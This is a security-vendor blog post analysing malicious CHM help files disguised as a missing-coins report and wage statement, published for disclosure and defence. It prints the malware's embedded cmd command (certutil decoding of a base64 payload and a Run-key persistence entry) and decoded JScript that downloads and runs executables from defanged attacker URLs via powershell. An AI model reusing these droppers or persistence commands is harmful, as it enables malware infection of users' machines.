<div>
Posted on <a href="https://asec.ahnlab.com/en/34313/" rel="bookmark" title="3:01 pm">May 16, 2022</a>
<h1 class="title">Malicious Help File Disguised as Missing Coins Report and Wage Statement (*.chm)</h1>
<p>The ASEC analysis team has discovered a continuous distribution of malware disguised as a Windows Help File (*.chm). The most recent CHM file is identical to the file introduced in &lt;<a href="https://asec.ahnlab.com/en/32800/">APT Attack Being Distributed as Windows Help File (*.chm)</a>&gt; to download the additional malware.</p>
<p>It appears that the CHM file of this type is distributed in the form of a compressed file. The confirmed filenames of the compressed files and internal CHM files are as follows:</p>
<figure class="wp-block-table"><table><thead><tr><td>Names of Compressed Files</td><td>Names of Internal CHM Files</td></tr></thead><tbody><tr><td>Missing Coins Info.zip</td><td>lost.chm</td></tr><tr><td>Data.zip</td><td>Default.chm</td></tr><tr><td>Wage Statement.rar</td><td>salary.chm</td></tr></tbody></table><figcaption>Table 1. Confirmed Filenames</figcaption></figure>
<p></p>
<p>Missing Coins Info.zip file contains the following additional compressed file and Word file.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34169 jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%BD%94%EC%9D%B8%EB%B6%84%EC%8B%A4.png?resize=1017%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34169" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%BD%94%EC%9D%B8%EB%B6%84%EC%8B%A4.png?resize=1017%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Files inside Missing Coins Info.zip</figcaption></figure>
<p></p>
<p>The Word file is an innocuous file that contains text related to missing coins (see Figure below).</p>
<figure class="aligncenter"><img alt="" class="wp-image-34204 jetpack-lazy-image" height="1020" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/word2.png?resize=1024%2C628&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1663"/><img alt="" class="wp-image-34204" height="1020" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/word2.png?resize=1024%2C628&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1663"/><figcaption>Figure 2. Word file</figcaption></figure>
<p></p>
<p>Find Missing Coins.rar contains lost.chm, and when it is run, it creates Help with content related to coins and performs malicious activities.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34174 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%9E%83%EC%9D%80%EC%BD%94%EC%9D%B8-1.png?resize=952%2C248&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34174" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%9E%83%EC%9D%80%EC%BD%94%EC%9D%B8-1.png?resize=952%2C248&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. Inside Find Missing Coins.rar</figcaption></figure>
<p></p>
<figure class="aligncenter"><img alt="" class="wp-image-34176 jetpack-lazy-image" height="811" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/lost.png?resize=1016%2C811&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1016"/><img alt="" class="wp-image-34176" height="811" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/lost.png?resize=1016%2C811&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1016"/><figcaption>Figure 4. Executed lost.chm</figcaption></figure>
<p></p>
<p>Inside the lost.chm file is the same HTML file and the internal special command introduced in the previous blog post. As such, running the CHM file results in the execution of the cmd command and the creation of Document.dat and Document.jse in the %USERPROFILE%\Links\ folder. The difference from the previous is that Document.jse is created instead of Document.vbs.</p>
<code class="language-plain">&lt;OBJECT id=shortcut classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" width=1 height=1&gt;
&lt;PARAM name="Command" value="ShortCut"&gt;
&lt;PARAM name="Button" value="Bitmap:shortcut"&gt;
&lt;PARAM name="Item1" value=',cmd, /c echo I0B+XnZBQUFBQT09LW1EfmsnCStoLGIxT2s3K3ByKExuXkRgSnFqbU1rd0QganR/Vl5KYmlAI0AmN2wuUDF4SjE6W35KbVAyR1MrLi80bl5WfmJoTVBPS0VEV1B1WWh3dS13XmtEL2sgK1grUDRPT3drKUp6V1dhcn80bk5jXldzeltDRGw0Q2R/els0YzI0d19EWGErJzhQTH4vRGwuWSxdT2hhXS0nXi9NLy9jbmErcmlAI0AmZFIuOwlgXn5aUzBtVmRuKmkyRDRBQUE9PV4jfkAA &gt; "%USERPROFILE%\Links\Document.dat" &amp; start /MIN certutil -decode "%USERPROFILE%\Links\Document.dat" "%USERPROFILE%\Links\Document.jse" &amp; start /MIN REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Document /t REG_SZ /d "%USERPROFILE%\Links\Document.jse" /f'&gt;
&lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
shortcut.Click();
&lt;/SCRIPT&gt;</code>
<p>The data that exists in Document.dat is base64-decoded and saved as Document.jse. The decoded JSE data then uses powershell to download the additional file from a certain URL and runs it (see below).</p>
<code class="language-plain">var s=new ActiveXObject("WScript.Shell");
var c="cmd /c powershell iwr -outf %tmp%\\csrss.exe hxxps://foxiebed[.]com/database/db.php?type=1 &amp; start %tmp%\\csrss.exe";
s.run(c,0,false);</code>
<p>Afterward, it adds %USERPROFILE%\Links\Document.jse to HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to ensure that the JSE file can be continuously run.</p>
<p>The following CHM files were found subsequently.</p>
<ul><li>Wage Statement.rar – salary.chm</li></ul>
<figure class="aligncenter"><img alt="" class="wp-image-34183 jetpack-lazy-image" height="874" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/salary.png?resize=1024%2C660&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1356"/><img alt="" class="wp-image-34183" height="874" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/salary.png?resize=1024%2C660&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1356"/><figcaption>Figure 5. Executed salary.chm</figcaption></figure>
<p></p>
<figure class="wp-block-table"><table><tbody><tr><td>(new ActiveXObject(“WScript.Shell”)).run(“cmd /c powershell iwr -outf %tmp%\\sihost.exe hxxps://cerebrovascular[.]net/resource/post &amp; start %tmp%\\sihost.exe mLzio512pQo”,0,false)</td></tr></tbody></table><figcaption>Data of decoded Document.jse</figcaption></figure>
<p></p>
<ul><li>Data.zip – Default.chm</li></ul>
<p>This file is compressed with an innocuous PDF file, in a similar fashion to the aforementioned Missing Coins Info.zip.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34191 jetpack-lazy-image" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/pdf.png?resize=1024%2C381&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="3022"/><img alt="" class="wp-image-34191" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/pdf.png?resize=1024%2C381&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="3022"/><figcaption>Figure 8. Innocuous PDF file</figcaption></figure>
<p></p>
<figure class="aligncenter"><img alt="" class="wp-image-34194 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EA%B8%B0%EB%B3%B82-1.png?resize=1024%2C664&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34194" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EA%B8%B0%EB%B3%B82-1.png?resize=1024%2C664&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 9. Executed Default.chm</figcaption></figure>
<p></p>
<figure class="wp-block-table"><table><tbody><tr><td>(new ActiveXObject(“WScript.Shell”)).run(“cmd /c powershell iwr -outf %tmp%\\lsass.exe hxxps://trueliebe[.]com/kettle/pot &amp; start %tmp%\\lsass.exe Dmzei125oAl”,0,false)</td></tr></tbody></table><figcaption>Data of decoded Document.jse</figcaption></figure>
<p>The team could not find extra files because the access to the download URL is currently blocked, but users must stay vigilant as the attack may upload various malicious files in the future.</p>
<p>AhnLab’s anti-malware product, V3, detects and blocks the malware using the alias below.</p>
<p>[File Detection]
Trojan/CHM.Agent</p>
<p>[IOC]
aac428717f4b5ea1bfac9ae0998e661c
7467a360837a85ace6e14acc879e00e5
13446d8496858c2eac78e5e985af605b
hxxps://foxiebed[.]com/database/db.php?type=1
hxxps://cerebrovascular[.]net/resource/post
hxxps://trueliebe[.]com/kettle/pot</p>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/chm-en/" rel="tag">chm</a></p>
</div>